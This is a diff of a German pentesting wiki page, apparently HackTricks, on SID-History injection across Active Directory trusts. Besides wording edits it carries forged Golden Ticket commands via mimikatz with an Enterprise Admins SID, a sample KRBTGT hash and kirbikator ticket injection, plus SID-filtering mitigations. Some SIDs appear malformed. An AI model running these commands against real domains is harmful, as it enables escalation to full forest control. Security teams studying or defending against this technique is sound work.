@@ -6,9 +6,9 @@
 
 Der Fokus des **SID-History Injection Angriffs** liegt darauf, **Benutzermigrationen zwischen Domänen** zu unterstützen und gleichzeitig den Zugriff auf Ressourcen der ehemaligen Domäne zu gewährleisten. Dies wird erreicht, indem **der vorherige Sicherheitsbezeichner (SID) des Benutzers in die SID-History** seines neuen Kontos integriert wird. Bemerkenswerterweise kann dieser Prozess manipuliert werden, um unbefugten Zugriff zu gewähren, indem der SID einer hochprivilegierten Gruppe (wie Enterprise Admins oder Domain Admins) aus der übergeordneten Domäne zur SID-History hinzugefügt wird. Diese Ausnutzung gewährt Zugriff auf alle Ressourcen innerhalb der übergeordneten Domäne.
 
-Es gibt zwei Methoden, um diesen Angriff auszuführen: durch die Erstellung eines **Golden Ticket** oder eines **Diamond Ticket**.
+Es gibt zwei Methoden zur Durchführung dieses Angriffs: durch die Erstellung eines **Golden Ticket** oder eines **Diamond Ticket**.
 
-Um den SID für die Gruppe **"Enterprise Admins"** zu bestimmen, muss zunächst der SID der Root-Domäne gefunden werden. Nach der Identifizierung kann der SID der Enterprise Admins-Gruppe konstruiert werden, indem `-519` an den SID der Root-Domäne angehängt wird. Wenn der SID der Root-Domäne beispielsweise `S-1-5-21-280534878-1496970234-700767426` ist, wäre der resultierende SID für die Gruppe "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.
+Um den SID für die Gruppe **"Enterprise Admins"** zu ermitteln, muss zunächst der SID der Root-Domäne gefunden werden. Nach der Identifizierung kann der SID der Enterprise Admins-Gruppe konstruiert werden, indem `-519` an den SID der Root-Domäne angehängt wird. Wenn der SID der Root-Domäne beispielsweise `S-1-5-21-280534878-1496970234-700767426` ist, wäre der resultierende SID für die Gruppe "Enterprise Admins" `S-1-5-21-280534878-1496970234-700767426-519`.
 
 Sie könnten auch die **Domain Admins**-Gruppen verwenden, die mit **512** enden.
 
@@ -22,7 +22,7 @@ Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSi
 Laut den [**Docs**](https://technet.microsoft.com/library/cc835085.aspx):
 - **Deaktivierung der SID-Historie bei Forest-Vertrauen** mit dem netdom-Tool (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
 - **Anwendung der SID-Filterquarantäne auf externe Verträge** mit dem netdom-Tool (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Anwendung der SID-Filterung auf Domänenverträge innerhalb eines einzelnen Forests** wird nicht empfohlen, da es sich um eine nicht unterstützte Konfiguration handelt und zu brechenden Änderungen führen kann. Wenn eine Domäne innerhalb eines Forests nicht vertrauenswürdig ist, sollte sie kein Mitglied des Forests sein. In diesem Fall ist es notwendig, zuerst die vertrauenswürdigen und nicht vertrauenswürdigen Domänen in separate Forests zu trennen, auf die die SID-Filterung auf ein Interforest-Vertrauen angewendet werden kann.
+- **Anwendung der SID-Filterung auf Domänenverträge innerhalb eines einzelnen Forests** wird nicht empfohlen, da es sich um eine nicht unterstützte Konfiguration handelt und zu brechenden Änderungen führen kann. Wenn eine Domäne innerhalb eines Forests nicht vertrauenswürdig ist, sollte sie kein Mitglied des Forests sein. In dieser Situation ist es notwendig, zuerst die vertrauenswürdigen und nicht vertrauenswürdigen Domänen in separate Forests zu trennen, auf die die SID-Filterung auf ein Interforest-Vertrauen angewendet werden kann.
 
 Überprüfen Sie diesen Beitrag für weitere Informationen zum Umgehen dieser: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
@@ -63,12 +63,14 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 Für weitere Informationen zu Golden Tickets siehe:
 
+
 {{#ref}}
 golden-ticket.md
 {{#endref}}
 
 
 Für weitere Informationen zu Diamond Tickets siehe:
+
 
 {{#ref}}
 diamond-ticket.md
@@ -78,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Erhöhen Sie sich zum DA von Root oder Enterprise-Admin unter Verwendung des KRBTGT-Hashes der kompromittierten Domäne:
+Erhöhen Sie sich zu DA von Root oder Enterprise-Administrator unter Verwendung des KRBTGT-Hashes der kompromittierten Domäne:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
